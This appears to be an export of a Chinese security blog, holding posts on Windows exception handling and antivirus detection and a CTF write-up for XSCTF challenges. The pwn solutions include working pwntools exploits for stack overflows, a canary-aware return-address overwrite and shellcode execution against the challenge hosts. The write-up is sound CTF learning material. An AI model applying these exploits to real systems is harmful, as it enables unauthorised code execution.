API注册处理函数，系统会按注册顺序或反序调用所有处理函数。VEH特别适合全局错误监控、日志记录等场景，且不需要在代码中添加特殊的语言结构（如try/except）。 结构化异常处理（SEH）是Windows传统的核心异常处理方式，提供了基于调用栈的异常保护机制。它通过__try/__except/__finally块实现，采用链表结构并与函数调用堆栈紧密关联。SEH遵循”先注册后使用”的LIFO原则，这意味着最近设置的异常处理器会首先被调用。值得一提的是，C++异常处理机制在Windows平台的底层实现也是基于SEH的。 顶层异常过滤器作为应用程序级别的最后防线，负责处理所有未被捕获的异常。通过SetUnhandledExceptionFilter API，每个进程可以设置一个顶层异常过滤器。这一机制常用于实现崩溃转储功能，是构建自定义应用程序错误报告系统的理想选择。 当所有用户定义的异常处理器都无法处理异常时，操作系统的默认处理机制接管。系统会显示应用程序错误对话框，可能生成错误报告发送到Microsoft，并终止发生异常的进程，释放其占用的资源。这是保证系统稳定性的最后一道防线。 通过这种分层的异常处理机制，Windows提供了强大而灵活的错误处理能力，既适合开发人员进行调试，也能为最终用户提供较好的错误恢复体验。对于安全研究人员来说，深入理解这套机制对于漏洞分析和利用同样具有重要意义。","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://uniqueland.top/tags/Windows/"}]},{"title":"病毒扫描背后的秘密：从特征码到智能防御的技术揭秘","slug":"virus_defence","date":"2025-03-31T14:00:59.126Z","updated":"2025-03-31T14:27:37.497Z","comments":true,"path":"2025/03/31/virus_defence/","link":"","permalink":"http://uniqueland.top/2025/03/31/virus_defence/","excerpt":"","text":"在数字世界中，病毒与杀毒软件的对抗从未停歇。要实现精准的病毒查杀，核心依赖于三大技术：病毒特征码识别、行为监控以及启发式分析。本文将解析这些技术的原理与实现方式，揭开病毒扫描背后的原理。 病毒扫描的核心：特征码检测特征码检测的实现过程病毒特征码是从病毒样本中提取的独特二进制代码片段，通常不超过64字节，可视为病毒的“数字指纹”。特征码检测的实现需要经过以下技术流程： 样本采集与预处理通过沙箱捕获、用户上报或蜜罐系统收集病毒样本。例如，安全厂商VirusTotal每天接收超过100万份可疑文件，经人工分析后提取有效特征码。样本需经过脱壳（如UPX、ASPack等常见壳）、解密等预处理，以获取病毒原始代码。 代码逆向与特征定位使用逆向工具（如IDA Pro、Ghidra）分析病毒二进制文件，定位核心功能模块（如感染模块、加密函数）。例如，WannaCry病毒的MS17-010漏洞利用代码段会被标记为关键特征。为确保特征码稳定性，通常会选择代码段（.text节）而非数据段（.data节），避免病毒变种修改数据导致失效。 复合特征码生成对多态病毒（如Emotet），需提取多段特征码形成逻辑组合。例如，某勒索病毒的特征码可能包括： 字符串特征：&quot;This file is encrypted by [家族名]&quot;； 代码特征：特定API调用序列（如CryptEncrypt→DeleteFile）； 哈希特征：加密函数所在代码节的SHA-256值。 特征码优化与验证使用工具（如MyCCL）进行冲突测试：将特征码插入正常文件，验证是否触发误报。通过模糊哈希（ssdeep）技术降低特征码对微小修改的敏感度，提升对抗变种病毒的能力。 行为监控：实时防御的“动态哨兵”行为监控的技术原理行为监控不依赖静态特征码，而是通过钩子（Hook）技术实时监控程序行为，主要关注以下高危操作： 文件操作：短时间内加密大量文件（如勒索病毒行为）； 进程注入：将代码写入其他进程内存（如DLL注入）； 注册表篡改：修改系统启动项或服务配置； 网络行为：异常端口扫描或C2服务器通信。 实现流程示例（以勒索病毒检测为例） API监控层通过内核级钩子（如Windows的SSDT Hook）监控CreateFile、WriteFile等文件操作API。当某进程连续调用CreateFile打开100个文档文件，立即触发预警。 行为关联分析结合上下文判断操作风险：若该进程同时调用CryptGenKey生成加密密钥，并删除卷影副本（通过vssadmin.exe），则判定为勒索病毒，触发实时拦截。 沙箱验证机制对可疑进程进行隔离运行（如Cuckoo沙箱），观察其是否释放加密勒索信（如README.txt），最终确认恶意行为。 启发式分析：未知威胁的“逻辑捕手”启发式分析的核心机制启发式分析通过预定义规则集对程序进行风险评分，主要检测以下可疑模式： 代码结构异常 PE头信息篡改（如入口点指向资源节）； 节区段熵值过高（可能经过加密或压缩）； 导入表异常（如仅依赖LoadLibrary和GetProcAddress动态加载API）。 行为模式评分构建评分系统（满分100分），例如： 创建自启动项：+20分； 尝试关闭杀毒软件进程：+30分； 无数字签名且评分超过70分：判定为恶意程序。 机器学习模型使用随机森林或神经网络模型，输入特征包括： API调用序列（如VirtualAlloc→WriteProcessMemory→CreateRemoteThread的典型注入序列）； 字符串特征（如硬编码IP地址或域名）； 代码相似度（与已知病毒家族的代码块匹配度）。 病毒库的高效构建与匹配机制病毒库的工程化设计直接影响扫描性能。典型方案包括： 分库存储：按特征码哈希首字母划分16个子库，减少遍历次数； 增量更新：仅同步新增特征码，避免全量下载占用资源； 并行处理：多线程同时扫描文件的不同区段，充分利用多核CPU性能。 技术演进与未来防御趋势当前病毒防御面临两大挑战： 未知病毒检测：传统特征码仅能应对已知威胁； 零日攻击防御：APT攻击常利用未公开漏洞，绕过常规检测。 未来技术将向以下方向发展： AI与机器学习：通过训练模型识别恶意代码模式，例如分析API调用序列或内存行为异常； 云安全协同：实时共享全球病毒特征数据，构建分布式威胁情报网络； 主动防御系统：基于程序行为实时拦截可疑操作，而非依赖事后特征匹配。 用户防护建议 选择杀毒软件：优先考虑病毒库更新频率快、资源占用低的工具； 系统维护：定期安装安全补丁，避免漏洞被利用； 安全意识：谨慎扫描不明来源的二维码或链接，防止钓鱼攻击。 结语病毒防御是技术与意识的双重博弈。尽管特征码技术仍是当前主流，但其局限性催生了行为分析、AI预测等新一代解决方案。用户需在依赖技术防护的同时，保持警惕，方能构筑全面的数字安全防线。","categories":[],"tags":[{"name":"CyberSecurity","slug":"CyberSecurity","permalink":"http://uniqueland.top/tags/CyberSecurity/"}]},{"title":"XSCTF_fresh","slug":"xsctf_fresh","date":"2024-11-09T19:03:42.512Z","updated":"2024-11-09T19:29:29.091Z","comments":true,"path":"2024/11/10/xsctf_fresh/","link":"","permalink":"http://uniqueland.top/2024/11/10/xsctf_fresh/","excerpt":"","text":"c_master请使用简单的C语句对程序进行getshell吧！ 123456Try to write a C getshell program with my code!read(0,base,0x8);write(1,base,0x8);base+&#x3D;8;base-&#x3D;8;return 0; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-1Ch] void *s; // [rsp+8h] [rbp-18h] char v6[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); init(argc, argv, envp); v4 = 0; s = malloc(0x400uLL); memset(s, 0, 1024uLL); puts(&quot;Try to write a C getshell program with my code!&quot;); puts(&quot;read(0,base,0x8);&quot;); puts(&quot;write(1,base,0x8);&quot;); puts(&quot;base+=8;&quot;); puts(&quot;base-=8;&quot;); puts(&quot;return 0;&quot;); while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;&gt;&gt;&gt;&quot;); __isoc99_scanf(&quot;%128s&quot;, s); if ( strcmp((const char *)s, &quot;read(0,base,0x8);&quot;) ) break; puts(&quot;input:&quot;); read(0, &amp;v6[v4], 8uLL); &#125; if ( strcmp((const char *)s, &quot;write(1,base,0x8);&quot;) ) break; puts(&quot;output:&quot;); write(1, &amp;v6[v4], 8uLL); &#125; if ( strcmp((const char *)s, &quot;base+=8;&quot;) ) break; v4 += 8; &#125; if ( strcmp((const char *)s, &quot;base-=8;&quot;) ) break; v4 -= 8; &#125; if ( strcmp((const char *)s, &quot;return 0;&quot;) ) break; puts(&quot;No such code...&quot;); &#125; return 0;&#125; 根据输入确定写入数据的地址，那么可以直接将位置定位到main函数的返回地址，写入程序中提供的backdoor函数需要注意程序开了canary，所以要多往后走一次 Low Address … local var &lt;- rsp canary value &lt;- rbp-8 old rbp &lt;- rbp return address args High Address … 坑：直接返回到backdoor函数又不可以，需要返回到实际执行system函数的代码地址 exp 123456789101112131415161718from pwn import *p = remote(&quot;43.248.97.213&quot;, 30483)p.recv()p.sendline(b&quot;base+=8;&quot;)p.recv()p.sendline(b&quot;base+=8;&quot;)p.recv()p.sendline(b&quot;base+=8;&quot;)p.recv()p.sendline(b&quot;read(0,base,0x8);&quot;)p.recv()p.sendline(p64(0x4012c3))p.recv()p.sendline(b&quot;return 0;&quot;)p.interactive() XSCTF&#123;p1e4se_bec0me_4_c_m4ster_x5c7f&#125; rock_paper_scissors欢迎来到石头剪刀布！一共进行三十局，你赢了加一分，输了或平局不得分获得十分就算胜利！输入’石头’、’剪刀’或’布’来进行游戏 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax char v5[28]; // [rsp+0h] [rbp-30h] BYREF int v6; // [rsp+1Ch] [rbp-14h] unsigned int RandomMove; // [rsp+20h] [rbp-10h] unsigned int userout; // [rsp+24h] [rbp-Ch] int v9; // [rsp+28h] [rbp-8h] signed int v10; // [rsp+2Ch] [rbp-4h] v10 = 0; v9 = 0; v3 = time(0LL); srand(v3); puts(&amp;byte_402080); puts(&amp;byte_4020A0); puts(&amp;byte_4020E6); puts(&amp;byte_402108); while ( v10 &lt;= 9 &amp;&amp; v9 &lt;= 29 ) &#123; printf(&amp;byte_402139); fflush(stdout); if ( v10 &gt; 5 ) gets(v5); __isoc99_scanf(&amp;unk_402151, v5); userout = stringToMove(v5); if ( userout == -1 ) &#123; puts(&amp;byte_402158); &#125; else if ( v10 &gt; 8 || v10 &lt;= 5 || (int)hard() &lt;= 2 ) &#123; if ( v10 == 9 &amp;&amp; (unsigned int)hell() != 666 ) &#123;LABEL_10: win(userout, v10); &#125; else &#123; RandomMove = getRandomMove(); printf(&amp;format); if ( RandomMove == 2 ) &#123; puts(&amp;byte_402037); &#125; else if ( RandomMove &lt;= 2 ) &#123; if ( RandomMove ) puts(&amp;byte_40203E); else puts(&amp;s2); &#125; v6 = determineWinner(userout, RandomMove); if ( v6 == 1 ) &#123; puts(&amp;byte_4021A7); ++v10; &#125; else if ( v6 == -1 ) &#123; puts(&amp;byte_402054); &#125; else &#123; puts(&amp;byte_402073); &#125; printf(&amp;byte_402061, (unsigned int)v10); ++v9; &#125; &#125; else &#123; if ( (int)hard() &lt;= 4 ) goto LABEL_10; bewin(userout, v10); &#125; &#125; final(); return 0;&#125; 其中final函数就是最终的shell，而gets函数存在漏洞，可以使用栈溢出将当前函数的返回地址覆盖为final函数的返回地址但是传输的payload需要符合一定条件因为程序对输入进行了检查，输入的字符串必须是石头剪刀布的一种这种情况下可以用%00作为payload，即输入石头的编码后加上%00，这样程序在处理字符串时遇到%00就会认为已经到字符串末尾了，而实际的payload会全部传输到内存中 中文在C语言中使用utf-8编码，一个中文字符占用三个字节在构造payload时要注意端序，例如“石头”的utf-8编码是E79FB3E5A4B4但是实际传输时是p64(0xe5b39fe7)+p64(0xb4a4) exp 123456789from pwn import *# p = process(&#x27;./rock_paper_scissors&#x27;)p = remote(&#x27;43.248.97.213&#x27;, 30480)# print(list(p64(0xe5b39fe7)+p64(0xb4a4)))p.recv()p.sendline(p64(0xe5b39fe7)+p64(0xb4a4)+b&#x27;a&#x27;*20+b&#x27;b&#x27;*8+p64(0x4012db))p.interactive() XSCTF&#123;1bab71b8-117f-4dea-a047-340b72101d7b&#125; toolong一个字节能解决的shellcode，就不要用两个字节！ 程序两次接收用户输入，其中第二次应该输入shellcode，之后程序会将用户输入的shellcode直接执行，但是题目限制了输入shellcode的长度（24） 题目给的可执行文件反汇编失败，估计是将字符串地址作为函数地址直接调用导致的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273.text:000055A4CE79820E ; int __cdecl main(int argc, const char **argv, const char **envp).text:000055A4CE79820E public main.text:000055A4CE79820E main proc near ; DATA XREF: _start+18↑o.text:000055A4CE79820E.text:000055A4CE79820E s&#x3D; byte ptr -150h.text:000055A4CE79820E buf&#x3D; byte ptr -50h.text:000055A4CE79820E var_8&#x3D; dword ptr -8.text:000055A4CE79820E var_4&#x3D; dword ptr -4.text:000055A4CE79820E.text:000055A4CE79820E ; __unwind &#123; &#x2F;&#x2F; 55A4CE797000.text:000055A4CE79820E endbr64.text:000055A4CE798212 push rbp.text:000055A4CE798213 mov rbp, rsp.text:000055A4CE798216 sub rsp, 150h.text:000055A4CE79821D mov eax, 0.text:000055A4CE798222 call init.text:000055A4CE798227 mov [rbp+var_8], 1.text:000055A4CE79822E lea rax, s ; &quot;Welcome to XSCTF&quot;.text:000055A4CE798235 mov rdi, rax ; s.text:000055A4CE798238 call _puts.text:000055A4CE79823D lea rax, [rbp+buf].text:000055A4CE798241 mov edx, 81 ; nbytes.text:000055A4CE798246 mov rsi, rax ; buf.text:000055A4CE798249 mov edi, 0 ; fd.text:000055A4CE79824E call _read.text:000055A4CE798253 lea rax, aInputYourMagic ; &quot;input your magic code:&quot;.text:000055A4CE79825A mov rdi, rax ; s.text:000055A4CE79825D call _puts.text:000055A4CE798262 lea rax, [rbp+s].text:000055A4CE798269 mov edx, 256 ; nbytes.text:000055A4CE79826E mov rsi, rax ; buf.text:000055A4CE798271 mov edi, 0 ; fd.text:000055A4CE798276 call _read.text:000055A4CE79827B mov [rbp+var_4], eax.text:000055A4CE79827E cmp [rbp+var_4], 0.text:000055A4CE798282 jg short loc_55A4CE79828B.text:000055A4CE798284 mov eax, 0.text:000055A4CE798289 jmp short locret_55A4CE7982DE.text:000055A4CE79828B ; ---------------------------------------------------------------------------.text:000055A4CE79828B.text:000055A4CE79828B loc_55A4CE79828B: ; CODE XREF: main+74↑j.text:000055A4CE79828B lea rax, [rbp+s].text:000055A4CE798292 mov rdi, rax ; s.text:000055A4CE798295 call _strlen.text:000055A4CE79829A mov edx, [rbp+var_8].text:000055A4CE79829D movsxd rdx, edx.text:000055A4CE7982A0 cmp rax, rdx.text:000055A4CE7982A3 ja short loc_55A4CE7982BA.text:000055A4CE7982A5 lea rax, [rbp+s].text:000055A4CE7982AC mov rdi, rax ; s.text:000055A4CE7982AF call _strlen.text:000055A4CE7982B4 cmp rax, 24.text:000055A4CE7982B8 jbe short loc_55A4CE7982D0.text:000055A4CE7982BA.text:000055A4CE7982BA loc_55A4CE7982BA: ; CODE XREF: main+95↑j.text:000055A4CE7982BA lea rax, aTooLong ; &quot;too long!&quot;.text:000055A4CE7982C1 mov rdi, rax ; s.text:000055A4CE7982C4 call _puts.text:000055A4CE7982C9 mov eax, 0.text:000055A4CE7982CE jmp short locret_55A4CE7982DE.text:000055A4CE7982D0 ; ---------------------------------------------------------------------------.text:000055A4CE7982D0.text:000055A4CE7982D0 loc_55A4CE7982D0: ; CODE XREF: main+AA↑j.text:000055A4CE7982D0 lea rax, [rbp+s].text:000055A4CE7982D7 call rax.text:000055A4CE7982D9 mov eax, 0.text:000055A4CE7982DE.text:000055A4CE7982DE locret_55A4CE7982DE: ; CODE XREF: main+7B↑j.text:000055A4CE7982DE ; main+C0↑j.text:000055A4CE7982DE leave.text:000055A4CE7982DF retn.text:000055A4CE7982DF ; &#125; &#x2F;&#x2F; starts at 55A4CE79820E.text:000055A4CE7982DF main endp 值得注意的点是程序接收了两次用户输入而在接收了两次输入之后程序会对输入进行两次检查 在调用read函数之后，程序使用strlen函数将输入的长度存储在rax中，接着程序会将rax与栈上的一个值进行比较，如果rax大于该值就不会执行shellcode 第二次是与一个固定值（24）比较，如果大于这个值就不会执行shellcode 其中第一次栈上的值其实可以通过第一次的输入修改，这样就可以绕过这次比较而第二次的比较需要在写入的payload中使用%00作为分隔符，分开正常输入和shellcode exp 1234567891011121314from pwn import *#p = process(&#x27;./toolong&#x27;)p = remote(&quot;43.248.97.213&quot;, 30510)p.recv()p.sendline(b&#x27;z&#x27;*80)p.recv()context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)shellcode = asm(shellcraft.sh()) + b&#x27;\\x00&#x27;p.sendline(p64(0x1234)+shellcode)p.interactive() XSCTF&#123;qy_7t11_y0u_th4t_y0ur_p4yl0ad_15_to0_lon9&#125; Lets_go_to_xor只是一个超级Eazzzzzzzzzzy的Go程序,Let&#39;s Go! 使用golang编写编译的可执行文件其主函数在main.main中 进入main.main找到main.decode 1234567891011121314151617181920212223242526__int64 __usercall main_decode@&lt;rax&gt;()&#123; __int64 v0; // rax unsigned __int64 v1; // rbx unsigned __int64 i; // [rsp+12h] [rbp-30h] if ( v1 != qword_C86F18 ) return 0LL; for ( i = 0LL; (__int64)v1 &gt; (__int64)i; ++i ) &#123; if ( i &gt;= v1 ) runtime_panicIndex(); if ( (unsigned __int64)((__int64)i % 10) &gt;= 0xA ) runtime_panicIndex(); if ( i &gt;= v1 ) runtime_panicIndex(); *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % 10] ^ *(_BYTE *)(i + v0); if ( i &gt;= v1 ) runtime_panicIndex(); if ( qword_C86F18 &lt;= i ) runtime_panicIndex(); if ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) ) return 0LL; &#125; return 1LL;&#125; 虽然和C语言不太一样，但是还是可以勉强看出来逻辑，大概就是下面这个意思 12345for ( i = 0LL; (__int64)v1 &gt; (__int64)i; ++i ) *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % 10] ^ *(_BYTE *)(i + v0); if ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) ) return 0LL; &#125; 找到main_enc和aIL0veCtf，提取数据，将main_enc与aIL0veCtf循环异或就可以得到flag exp 12345key = &#x27;i_l0ve_CtF&#x27;s = [0x0F, 0x33, 0x0D, 0x57, 0x0D, 0x3D, 0x0C, 0x14, 0x38, 0x0E, 0x21, 0x17, 0x33, 0x01, 0x05, 0x3A, 0x0F, 0x34, 0x1A, 0x19, 0x24, 0x6B, 0x1F, 0x64, 0x13, 0x17, 0x22]for i in range(len(s)): print(chr((s[i]^ord(key[i%10]))&amp;0xff), end=&#x27;&#x27;) flag&#123;XSWLHHH_1s_Pwn_M4sTer&#125; loglistening题目下发一个安装包jadx打开看到如下代码 12345678910111213141516171819202122232425262728293031323334package com.example.loglistening;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;import com.example.loglistening.databinding.ActivityMainBinding;public class MainActivity extends AppCompatActivity &#123; private ActivityMainBinding binding; public native void fasheng(); static &#123; System.loadLibrary(&quot;loglistening&quot;); &#125; /* access modifiers changed from: protected */ public void onCreate(Bundle bundle) &#123; super.onCreate(bundle); ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater()); this.binding = inflate; setContentView((View) inflate.getRoot()); ((Button) findViewById(C0587R.C0590id.button1)).setOnClickListener(new OnClickListener() &#123; public void onClick(View view) &#123; System.out.println(&quot;好像有什么事情在native层发生了!&quot;); MainActivity.this.fasheng(); Toast.makeText(MainActivity.this.getApplicationContext(), &quot;flag已经生成了！&quot;, 0).show(); &#125; &#125;); &#125;&#125; 是通过native层的代码生成的flag找到so文件扔进ida，找到flag的生成代码 12345678910unsigned __int64 Java_com_example_loglistening_MainActivity_fasheng()&#123; char v1[40]; // [rsp+0h] [rbp-38h] BYREF unsigned __int64 v2; // [rsp+28h] [rbp-10h] v2 = __readfsqword(0x28u); md5(&quot;stardustduststar&quot;, v1); __android_log_print(4LL, &quot;xilo&quot;, &quot;flag&#123;%s&#125;&quot;, v1); return __readfsqword(0x28u);&#125; 按道理说把字符串md5之后就可以得到flag了，但是失败了 看到log字样，直接查日志 模拟器开启开发者选项 adb devices确认连接成功 输入adb logcat -v time&gt;D:log.txt开始抓取日志，期间打开软件点击按钮生成flag 然后返回命令行Ctrl+C完成抓取 找到log.txt查看日志（虽然命令写的在D盘，但是实际上是在当前目录） flag&#123;4724110e8c8a83c123d6df82efee8c53&#125; picchange输入数字即可得到flag哦 一开始想的是直接扔进ida反编译然后看对图像的加密逻辑，也就是下面的代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647void __fastcall sub_7FF6B8023C20(const char *a1, __int64 a2)&#123; FILE *Stream; // [rsp+28h] [rbp+8h] FILE *Streama; // [rsp+28h] [rbp+8h] int v4; // [rsp+44h] [rbp+24h] void *Buffer; // [rsp+68h] [rbp+48h] int i; // [rsp+84h] [rbp+64h] sub_7FF6B80213C0(&amp;unk_7FF6B8036017); Stream = fopen(a1, &quot;rb&quot;); if ( Stream ) &#123; fseek(Stream, 0, 2); v4 = ftell(Stream); fseek(Stream, 0, 0); Buffer = malloc(v4); if ( Buffer ) &#123; fread(Buffer, 1ui64, v4, Stream); fclose(Stream); for ( i = 0; i &lt; v4; ++i ) *((_BYTE *)Buffer + i) ^= strtol((const char *)(i % 32 + a2), 0i64, 16); Streama = fopen(&quot;picc_xor.png&quot;, &quot;wb&quot;); if ( Streama ) &#123; fwrite(Buffer, 1ui64, v4, Streama); fclose(Streama); free(Buffer); sub_7FF6B80211CC(&amp;unk_7FF6B802CFB8); &#125; else &#123; perror(&amp;byte_7FF6B802CFA8); free(Buffer); &#125; &#125; else &#123; perror(&amp;byte_7FF6B802CF80); fclose(Stream); &#125; &#125; else &#123; perror(&amp;ErrMsg); &#125;&#125; 可以看到是对图像文件的每一个字节都进行了异或运算，但是异或的对象是不确定的在交叉引用到最原始的变量以及动态调试之后得出结论：使用的是输入的三位数字的md5值作为key，对图像文件进行循环异或的 1234567891011121314151617181920212223242526272829303132Stack[00001C64]:0000003589DCF5A8 db 32h ; 2Stack[00001C64]:0000003589DCF5A9 db 30h ; 0Stack[00001C64]:0000003589DCF5AA db 32h ; 2Stack[00001C64]:0000003589DCF5AB db 63h ; cStack[00001C64]:0000003589DCF5AC db 62h ; bStack[00001C64]:0000003589DCF5AD db 39h ; 9Stack[00001C64]:0000003589DCF5AE db 36h ; 6Stack[00001C64]:0000003589DCF5AF db 32h ; 2Stack[00001C64]:0000003589DCF5B0 db 61h ; aStack[00001C64]:0000003589DCF5B1 db 63h ; cStack[00001C64]:0000003589DCF5B2 db 35h ; 5Stack[00001C64]:0000003589DCF5B3 db 39h ; 9Stack[00001C64]:0000003589DCF5B4 db 30h ; 0Stack[00001C64]:0000003589DCF5B5 db 37h ; 7Stack[00001C64]:0000003589DCF5B6 db 35h ; 5Stack[00001C64]:0000003589DCF5B7 db 62h ; bStack[00001C64]:0000003589DCF5B8 db 39h ; 9Stack[00001C64]:0000003589DCF5B9 db 36h ; 6Stack[00001C64]:0000003589DCF5BA db 34h ; 4Stack[00001C64]:0000003589DCF5BB db 62h ; bStack[00001C64]:0000003589DCF5BC db 30h ; 0Stack[00001C64]:0000003589DCF5BD db 37h ; 7Stack[00001C64]:0000003589DCF5BE db 31h ; 1Stack[00001C64]:0000003589DCF5BF db 35h ; 5Stack[00001C64]:0000003589DCF5C0 db 32h ; 2Stack[00001C64]:0000003589DCF5C1 db 64h ; dStack[00001C64]:0000003589DCF5C2 db 32h ; 2Stack[00001C64]:0000003589DCF5C3 db 33h ; 3Stack[00001C64]:0000003589DCF5C4 db 34h ; 4Stack[00001C64]:0000003589DCF5C5 db 62h ; bStack[00001C64]:0000003589DCF5C6 db 37h ; 7Stack[00001C64]:0000003589DCF5C7 db 30h ; 0 这段数据就是输入的测试数据123对应的md5值，而为了解密图像，输入的key需要满足一定条件 12请输入你的key： 123MD5 的前三位数字与 key的本身值 不相等。注:数字范围为0--9 这里需要注意的主要是数字范围为0--9指的是输入的key还是md5的值，还是两者皆是答案是只有输入的key，因为作为循环异或的对象长度应该是一定的，而如果转换为十进制的话原本的md5编码的长度可能会变化，这一点也可以在先前对图像加密的代码中得出 1*((_BYTE *)Buffer + i) ^= strtol((const char *)(i % 32 + a2), 0i64, 16); 可以看到也是以32为周期的 所以现在的问题就是找到某三位数字，其md5的值的前三位与原本的值是相等的 生成正确的key 1234567891011import hashlibm = hashlib.md5()for i in range(0,10): for j in range(0, 10): for k in range(0, 10): num = f&quot;&#123;i*100+j*10+k:03d&#125;&quot; c = hashlib.md5(num.encode(&#x27;utf8&#x27;)).hexdigest() print(num, str(c)[0:3]) if str(num) == str(c)[0:3]: print(num) 这里有个坑，使用python实现md5编码还有一种先update再hexdigest的方法，那种方法在这里是行不通的320然后将key作为输入就可以得到解密后的图片了 flag&#123;pic_pic_is_so_easy!&#125; Ro1ling~题目描述 flag is rolling ~ flag is flying ~ press q to quit tips: The flag format is XSCTF\\&#123;[ -~]+\\&#125; 运行程序，会出现弹幕一样飘过的文字但是，在中止运行时出现了这样的报错 123456Traceback (most recent call last): File &quot;Ro1ling.py&quot;, line 97, in &lt;module&gt; File &quot;curses\\__init__.py&quot;, line 94, in wrapper File &quot;Ro1ling.py&quot;, line 94, in mainKeyboardInterrupt[21964] Failed to execute script &#x27;Ro1ling&#x27; due to unhandled exception! 熟悉的Traceback，一眼就能看出来是python 所以这是一个使用python编写并打包的exe文件能打包python的工具主要有pyinstaller等，这里使用对应的pyinstxtractor反编译 1python pyinstxtractor.py Ro1ling.exe 运行以上命令之后就会在当前目录下生成一个文件夹，其中有同名的pyc文件使用uncompyle6将pyc文件转换为py文件但是报错了使用在线网站的结果也是不完整的 上网查询之后找到这么一篇博客python逆向实战：反编译python3 pyc文件 - 乘舟凉 - 博客园 (cnblogs.com) 里边有手动提取opcode的示例代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import codefrom uncompyle6.main import decompileimport sys# version = (3, 8, 0)import disdef get_sub_codeObject_list(co): return [ins for ins in list(dis.Bytecode(co)) if &quot;code object&quot; in str(ins.argval)]outstream = sys.stdoutshowasm = Noneshowast = Falseshowgrammar = Falsesource_encoding = Nonemapstream = Nonedo_fragments = Falsefrom xdis import load_modulefilename = &quot;Ro1ling.pyc&quot;code_objects = &#123;&#125;(version, timestamp, magic_int, co, is_pypy, source_size, sip_hash) = load_module( filename, code_objects)def decompile_part(co,father_name=None,outstream=sys.stdout): try: if father_name is not None: name = &quot;%s.%s&quot; % (father_name,co.co_name) else: name = co.co_name outstream.write(&quot;\\n# %s ____________________________________________\\n&quot; % name) decompile( version, co, outstream, None, False, timestamp, False, None, code_objects=&#123;&#125;, source_size=source_size, is_pypy=False, magic_int=magic_int, mapstream=None, do_fragments=False, ) except: bytecode = get_sub_codeObject_list(co) for code in bytecode: co = code.argval decompile_part(co,name,outstream)decompile_part(co) 1234567891011121314import disimport marshalimport sysimport iosys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#x27;utf8&#x27;) #改变标准输出的默认编码if len(sys.argv) == 2: filename = sys.argv[1] with open(filename,&quot;rb&quot;) as fp: byteCode = fp.read()[16:] co = marshal.loads(byteCode) dis.dis(co) 先运行第一份代码，再运行第二份代码，就可以得到opcode的输出 1234567891011121314 28 72 BUILD_LIST 0 74 LOAD_CONST 6 ((&#x27;Summer in the hills&#x27;, &#x27;Those hazy days I do remember&#x27;, &#x27;We were running still&#x27;, &#x27;Had the whole world at our feet&#x27;, &#x27;Watching seasons change&#x27;, &#x27;Our roads were lined with adventure&#x27;, &#x27;Mountains in the way&#x27;, &quot;Couldn&#x27;t keep us from the sea&quot;, &#x27;Here we stand open arms&#x27;, &#x27;This is home where we are&#x27;, &#x27;Ever strong in the world that we made&#x27;, &#x27;I still hear you in the breeze&#x27;, &#x27;See your shadows in the trees&#x27;, &#x27;Holding on, memories never change&#x27;)) 76 CALL_FINALLY 1 (to 79) 78 STORE_DEREF 2 (phrases) 29 80 LOAD_CONST 7 (&#x27;𝙓𝙎𝘾𝙏𝙁&#123;𝙁0𝙧_0𝙣𝙘3_𝙮0𝙪_𝙝4𝙫3_7𝙖57𝙚𝙙_𝙛𝙡𝙞𝙜 𝙝𝙩_𝙮0𝙪_𝙬1𝙡𝙡_�44𝙡𝙠_7𝙝3_3𝙖𝙧7𝙝_𝙬17𝙝_𝙮0𝙪𝙧_3𝙮35_7𝙪𝙧𝙣3𝙙_5𝙠𝙮𝙬4𝙧𝙙5&#125;&#x27;) 82 STORE_DEREF 3 (secret_message) 46 84 LOAD_DEREF 4 (stdscr) &gt;&gt; 86 LOAD_METHOD 7 (nodelay) 88 LOAD_CONST 8 (True) 90 CALL_METHOD 1 92 POP_TOP 其中因为命令行的编码原因这里的flag其实是乱码（因此我还分析了一下opcode有没有加密的过程，事实证明没有）但是opcode转换为py代码的方式没有找到 在复制到其他文本编辑器之后就可以看到flag了（要手打，因为格式写了只支持ascii编码的字符，这里是unicode） XSCTF&#123;F0r_0nc3_y0u_h4v3_7a57ed_flight_y0u_w1ll_w4lk_7h3_3ar7h_w17h_y0ur_3y35_7urn3d_5kyw4rd5&#125;这flag真长啊 Running~一个没有后缀的文件，内容是js代码 1var _0x21b6c9=_0xe50d;function _0xe50d(_0x483c4e,_0x3bb3e1)&#123;var _0x1173b4=_0x1173();return _0xe50d=function(_0xe50d90,_0x1a4c11)&#123;_0xe50d90=_0xe50d90-0x105;var _0x33ff31=_0x1173b4[_0xe50d90];return _0x33ff31;&#125;,_0xe50d(_0x483c4e,_0x3bb3e1);&#125;function _0x1173()&#123;var 